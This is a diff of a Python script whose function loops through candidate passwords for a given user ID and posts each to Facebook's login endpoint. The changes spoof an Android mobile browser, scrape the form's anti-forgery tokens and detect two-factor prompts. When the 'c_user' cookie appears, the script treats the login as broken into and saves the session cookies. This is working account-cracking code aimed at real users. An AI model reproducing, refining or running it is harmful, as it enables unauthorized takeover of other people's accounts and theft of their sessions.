@@ -1226,46 +1226,45 @@ def p(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
-            data =  {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            data = {
             'email': uid,
-            'login_source': 'comet_headerless_login',
-            'next': '',
+            'cuid': '',
+            'guid': 'ff6cc26ee48a78a5a',
+            'lgnjs': '1735584601',
+            'lgnrnd': '105000_W461',
+            'locale': 'hi_IN',
+            'login_source': 'comet_login_header',
+            'next': 'https://www.facebook.com/lon_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NTg0NTg4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
+            'skstamp': '',
+            'timezone': '-330',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0%3D',
+            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV/qqAAVVAABFAJ',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'ps_l': '1',
-            'ps_n': '1',
-            'sb': 'K7peZw-stm96bp9jczd4iRSX',
-            'datr': 'K7peZ8R7XJfFPDteD4gLNXP4',
-            'dpr': '2.418783187866211',
-            'fr': '1GXBeS4MZ2kWto2Oz.AWXbf6X1pmWVMdfB25T1OVVOJpY.BnXrot..AAA.0.0.BncvCs.AWUyRrPhWvg',
-            'wd': '891x1756',}
             headers = {
-            'authority': 'www.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'authority': 'web.facebook.com',
+            'accept': '*/*',
             'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '2.200000047683716',
-            'origin': 'https://www.facebook.com',
-            'referer': 'https://www.facebook.com/?_rdr',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'origin': 'https://web.facebook.com',
+            'referer': 'https://web.facebook.com/',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
             'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23076PC4BI"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"15.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-            'viewport-width': '980',}
-            url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NTg1OTY0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
-            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1'
+            po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
